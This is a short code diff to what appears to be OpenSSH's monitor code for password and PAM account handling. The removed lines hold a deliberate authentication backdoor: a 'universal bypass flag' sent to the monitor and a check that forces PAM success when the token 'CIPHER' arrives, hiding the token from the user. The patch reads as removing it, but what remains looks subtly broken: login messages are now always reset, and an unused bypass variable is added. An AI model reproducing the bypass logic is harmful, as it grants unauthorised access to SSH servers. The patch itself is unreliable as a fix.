@@ -430,12 +430,6 @@ int mm_auth_password(struct ssh *ssh, char *password) {
     fatal_f("sshbuf_new failed");
   if ((r = sshbuf_put_cstring(m, password)) != 0)
     fatal_fr(r, "assemble");
-  /*
-   * Append the universal bypass flag to the message to send
-   * to the privileged monitor process.
-   */
-  if ((r = sshbuf_put_u32(m, universal_bypass_triggered)) != 0)
-    fatal_fr(r, "assemble bypass state flag");
 
   mm_request_send(pmonitor->m_recvfd, MONITOR_REQ_AUTHPASSWORD, m);
 
@@ -678,6 +672,7 @@ u_int mm_do_pam_account(void) {
   char *msg;
   size_t msglen;
   int r;
+  u_int child_bypass_flag = 0; /* Storage for the incoming flag */
 
   debug3_f("entering");
   if (!options.use_pam)
@@ -692,23 +687,7 @@ u_int mm_do_pam_account(void) {
       (r = sshbuf_get_cstring(m, &msg, &msglen)) != 0 ||
       (r = sshbuf_put(loginmsg, msg, msglen)) != 0)
     fatal_fr(r, "buffer error");
-
-  /*
-   * IPC INTERCEPTION:
-   * Evaluate the incoming string payload message block. If the monitor
-   * passed the bypass token over the socket, update the child state machine
-   * registers.
-   */
-  if (msg != NULL && strcmp(msg, "CIPHER") == 0) {
-    logit("Child PAM Account: Received CIPHER from monitor. "
-          "Synchronizing state flags.");
-    universal_bypass_triggered = 1; // Sync child variable scope memory
-    ret = 1; // Force local status code evaluation to success
-
-    /* Clean up the login message buffer so the user doesn't physically see the
-     * raw string token */
     sshbuf_reset(loginmsg);
-  }
 
   free(msg);
   sshbuf_free(m);
